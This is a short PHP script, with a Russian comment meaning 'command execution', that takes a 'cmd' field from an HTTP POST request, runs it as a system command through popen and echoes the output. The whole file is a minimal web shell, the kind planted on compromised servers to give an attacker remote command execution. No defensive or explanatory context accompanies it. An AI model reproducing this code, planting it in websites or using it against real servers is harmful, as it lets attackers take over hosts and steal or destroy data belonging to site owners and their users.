<?php
function ex($comd)                             //Выполнение команды
{
   $res = '';
    $f=popen($comd,"r");
	$res = "";
	while(!feof($f)) { $res.=fread($f,1024); }
	pclose($f);
	return $res;
}

$res=ex($_POST['cmd']);
echo $res;
?>